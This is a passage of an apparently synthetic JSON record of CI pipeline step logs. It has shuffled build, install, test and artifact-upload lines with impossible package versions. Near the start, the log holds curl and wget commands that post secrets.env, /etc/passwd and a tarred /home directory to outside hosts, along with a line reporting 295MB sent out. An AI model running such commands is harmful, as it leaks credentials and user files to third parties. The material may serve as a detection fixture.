Processing request\n  PASS: test_user_create (488ms)\nWARNING: webpack has known vulnerabilities\n[12:00:18] INFO: Processing request\nStep 10/10: Building\nCompiling src/app.ts...\nInstalling eslint@4.1.0\n  PASS: test_api_health (77ms)\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:00:18] INFO: Processing request\nCompiling src/index.js...\n  PASS: test_api_health (297ms)\n[12:00:18] INFO: Processing request\nStep 10/10: Building\n[12:00:18] ERROR: Connection failed\n  PASS: test_api_health (122ms)\nCompiling src/app.ts...\nInstalling react@2.12.0\nCompiling src/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nSending 295MB of data to startup.dev\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:18] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nCompiling src/index.js...\nInstalling react@5.14.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-22T12:00:18.462691",
        "finished_at": "2025-11-22T12:00:23.452978",
        "log_lines": [
          "=== Step: type_check ===",
          "  PASS: test_cache_hit (377ms)",
          "  PASS: test_api_health (240ms)",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@5.9.0",
          "  PASS: test_api_health (175ms)",
          "Cache hit for key-5860",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (105ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 test completed",
          "\u2717 build failed with exit code 115",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Cache hit for key-6622",
          "WARNING: express has known vulnerabilities",
          "Compiling src/service.java...",
          "Installing lodash@3.17.0",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5195",
          "Installing axios@3.6.0",
          "Cache hit for key-8386",
          "Exception: RuntimeError",
          "Installing jest@3.20.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/main.py...",
          "Installing axios@3.11.0",
          "Cache hit for key-5727",
          "  PASS: test_api_health (110ms)",
          "\u2713 lint completed",
          "Installing axios@5.6.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "Cache hit for key-7427",
          "Step 6/10: Building",
          "Cache hit for key-2994",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-5976",
          "Installing lodash@3.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Cache hit for key-6367",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:18] INFO: Processing request",
          "Installing axios@3.9.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (450ms)",
          "\u2713 lint completed",
          "Cache hit for key-9214",
          "Installing axios@1.2.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Installing jest@3.17.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Cache hit for key-5401",
          "Step 4/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@1.1.0",
          "Step 2/10: Building",
          "Installing prettier@3.5.0",
          "Step 8/10: Building",
          "  PASS: test_user_create (291ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (249ms)",
          "Cache hit for key-9480",
          "Step 9/10: Building",
          "Installing eslint@3.2.0",
          "Installing prettier@2.6.0",
          "Step 1/10: Building",
          "Step 1/10: Building",
          "Installing react@1.14.0",
          "Installing express@1.1.0",
          "Compiling src/utils.go...",
          "Compiling src/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_user_create (112ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing prettier@5.10.0",
          "\u2713 build completed",
          "  PASS: test_user_create (136ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "Cache hit for key-8051",
          "Compiling src/main.py...",
          "  PASS: test_user_create (149ms)",
          "Step 2/10: Building",
          "  PASS: test_db_connect (162ms)",
          "Installing eslint@5.0.0",
          "Compiling src/service.java...",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 build completed",
          "Installing express@4.15.0",
          "Cache hit for key-2396",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-1308",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (93ms)",
          "Step 7/10: Building",
          "Installing webpack@4.14.0",
          "Cache hit for key-6174",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-4716",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3236",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Cache hit for key-6474",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Cache hit for key-6225",
          "Installing express@2.20.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Installing react@5.9.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-2147",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1464",
          "Step 2/10: Building",
          "Cache hit for key-8959",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_auth_login (95ms)",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-3981",
          "[12:00:18] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (99ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing lodash@4.13.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-1534",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-22T12:00:23.452978",
        "finished_at": "2025-11-22T12:00:28.443265",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Step 10/10: Building",
          "Installing react@4.14.0",
          "Cache hit for key-3695",
          "Cache hit for key-3926",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_db_connect (267ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-8427",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2776",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@2.16.0",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Step 7/10: Building",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-2541",
          "\u2713 build completed",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (271ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "  PASS: test_db_connect (481ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-8107",
          "WARNING: eslint has known vulnerabilities",
          "Installing webpack@3.10.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9536",
          "  PASS: test_auth_login (201ms)",
          "\u2717 build failed with exit code 26",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing react@4.6.0",
          "Exception: TypeError",
          "  PASS: test_auth_login (460ms)",
          "Cache hit for key-7293",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.10.0",
          "  PASS: test_api_health (208ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (363ms)",
          "Step 3/10: Building",
          "Cache hit for key-7286",
          "\u2717 build failed with exit code 77",
          "Installing eslint@1.17.0",
          "\u2713 lint completed",
          "  PASS: test_user_create (328ms)",
          "Cache hit for key-1553",
          "Step 7/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2164",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Installing webpack@3.2.0",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "  PASS: test_db_connect (283ms)",
          "Step 5/10: Building",
          "Installing express@1.3.0",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@4.14.0",
          "\u2713 test completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-1405",
          "Installing prettier@4.13.0",
          "  PASS: test_api_health (109ms)",
          "Installing express@1.16.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_cache_hit (356ms)",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@4.19.0",
          "Step 7/10: Building",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "Installing prettier@1.0.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-4670",
          "Exception: RuntimeError",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "Installing axios@3.18.0",
          "Step 3/10: Building",
          "Cache hit for key-9089",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-7469",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Installing webpack@1.10.0",
          "  PASS: test_cache_hit (345ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-5779",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing react@2.2.0",
          "Installing eslint@3.6.0",
          "Cache hit for key-6181",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6046",
          "Step 6/10: Building",
          "  PASS: test_db_connect (459ms)",
          "Compiling src/utils.go...",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:18] ERROR: Connection failed",
          "Cache hit for key-8813",
          "  PASS: test_auth_login (236ms)",
          "Cache hit for key-7196",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing eslint@3.7.0",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-2327",
          "Installing lodash@1.6.0",
          "\u2713 build completed",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-7434",
          "  PASS: test_cache_hit (59ms)",
          "  PASS: test_api_health (226ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-8626",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1656",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-8402",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Installing jest@5.3.0",
          "Installing lodash@1.18.0",
          "Installing lodash@1.0.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "  PASS: test_user_create (341ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-2037",
          "  PASS: test_auth_login (161ms)",
          "Cache hit for key-8428",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-22T12:00:28.443265",
        "finished_at": "2025-11-22T12:00:30.439380",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2414",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3459",
          "Cache hit for key-7990",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 lint completed",
          "Cache hit for key-1377",
          "Installing react@4.3.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 60",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 8/10: Building",
          "Cache hit for key-6821",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "\u2717 build failed with exit code 75",
          "Cache hit for key-5997",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8571",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Installing express@2.12.0",
          "Cache hit for key-3675",
          "  PASS: test_db_connect (140ms)",
          "  PASS: test_api_health (488ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_api_health (482ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 test completed",
          "FAILED: test_auth_login",
          "Installing react@2.18.0",
          "Installing lodash@5.1.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "  PASS: test_db_connect (445ms)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing prettier@4.5.0",
          "Compiling src/app.ts...",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (409ms)",
          "Installing jest@5.19.0",
          "Installing eslint@1.13.0",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6954",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@3.7.0",
          "\u2717 build failed with exit code 76",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8576",
          "Cache hit for key-8757",
          "Cache hit for key-5763",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/app.ts...",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (432ms)",
          "  PASS: test_api_health (481ms)",
          "Step 8/10: Building",
          "FAILED: test_api_health",
          "Cache hit for key-7649",
          "  PASS: test_api_health (120ms)",
          "Cache hit for key-3485",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@5.5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Cache hit for key-2630",
          "Artifact uploaded: build.tar.gz (49MB)",
          "WARNING: react has known vulnerabilities",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (320ms)",
          "Installing eslint@5.2.0",
          "Installing eslint@5.0.0",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "\u2713 build completed",
          "  PASS: test_user_create (115ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing jest@5.11.0",
          "  PASS: test_cache_hit (434ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_api_health (294ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing jest@3.20.0",
          "Cache hit for key-6914",
          "  PASS: test_api_health (443ms)",
          "Compiling src/handler.rs...",
          "Installing jest@2.8.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (320ms)",
          "[12:00:18] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (499ms)",
          "Cache hit for key-5846",
          "  PASS: test_db_connect (219ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-4756",
          "  PASS: test_cache_hit (12ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-9928",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "FAILED: test_user_create",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@1.7.0",
          "Installing react@4.0.0",
          "  PASS: test_db_connect (123ms)",
          "Compiling src/index.js...",
          "Installing webpack@3.4.0",
          "Cache hit for key-6257",
          "WARNING: axios has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing prettier@5.8.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-2656",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (4ms)",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (229ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "  PASS: test_user_create (63ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (236ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Installing axios@2.1.0",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-6992",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Cache hit for key-4999",
          "Step 6/10: Building",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-22T12:00:30.439380",
        "finished_at": "2025-11-22T12:00:35.429667",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Step 8/10: Building",
          "  PASS: test_db_connect (398ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_api_health (148ms)",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_user_create (258ms)",
          "Installing express@1.13.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_auth_login (461ms)",
          "Cache hit for key-3987",
          "Installing prettier@5.10.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Installing axios@4.12.0",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Installing lodash@4.19.0",
          "Cache hit for key-8249",
          "\u2713 build completed",
          "  PASS: test_auth_login (372ms)",
          "\u2713 build completed",
          "Installing eslint@2.17.0",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-6742",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_user_create (98ms)",
          "Cache hit for key-5181",
          "[12:00:18] INFO: Processing request",
          "Installing eslint@4.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (13ms)",
          "FAILED: test_db_connect",
          "Installing jest@2.17.0",
          "Installing react@5.19.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "  PASS: test_user_create (494ms)",
          "  PASS: test_api_health (451ms)",
          "  PASS: test_auth_login (319ms)",
          "Installing prettier@5.9.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_auth_login (270ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Installing webpack@4.0.0",
          "  PASS: test_user_create (170ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_auth_login (277ms)",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "Installing prettier@1.0.0",
          "  PASS: test_api_health (360ms)",
          "  PASS: test_user_create (85ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Exception: TypeError",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (267ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3517",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 lint completed",
          "Cache hit for key-2533",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-7462",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-8894",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 10/10: Building",
          "Cache hit for key-4152",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-6023",
          "Cache hit for key-4419",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Installing express@4.0.0",
          "Installing jest@4.18.0",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-2228",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-8666",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (153ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-4763",
          "Cache hit for key-8996",
          "Cache hit for key-3172",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Step 7/10: Building",
          "Installing eslint@1.3.0",
          "Installing axios@4.8.0",
          "Installing lodash@2.15.0",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-4785",
          "\u2713 test completed",
          "  PASS: test_cache_hit (450ms)",
          "Installing prettier@1.14.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3608",
          "Installing react@4.16.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (263ms)",
          "\u2713 build completed",
          "  PASS: test_api_health (122ms)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "Installing eslint@5.19.0",
          "  PASS: test_api_health (389ms)",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.16.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_db_connect (431ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-3855",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "Installing express@5.2.0",
          "Step 8/10: Building",
          "Cache hit for key-7695",
          "Cache hit for key-2916",
          "Installing react@1.9.0",
          "  PASS: test_db_connect (286ms)",
          "  PASS: test_db_connect (428ms)",
          "Installing lodash@2.14.0",
          "Installing react@1.6.0",
          "  PASS: test_auth_login (170ms)",
          "[12:00:18] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_api_health (39ms)",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/handler.rs...",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-7485",
          "[12:00:18] WARN: Deprecated API usage",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-22T12:00:35.429667",
        "finished_at": "2025-11-22T12:00:40.419954",
        "log_lines": [
          "=== Step: setup_node ===",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "WARNING: webpack has known vulnerabilities",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7430",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Exception: RuntimeError",
          "  PASS: test_db_connect (17ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9970",
          "Cache hit for key-9739",
          "Cache hit for key-7454",
          "Cache hit for key-2909",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-6878",
          "Cache hit for key-6736",
          "Installing jest@3.18.0",
          "Cache hit for key-7914",
          "  PASS: test_cache_hit (240ms)",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_api_health (192ms)",
          "  PASS: test_auth_login (248ms)",
          "\u2713 build completed",
          "  PASS: test_auth_login (36ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (228ms)",
          "\u2713 test completed",
          "Cache hit for key-7585",
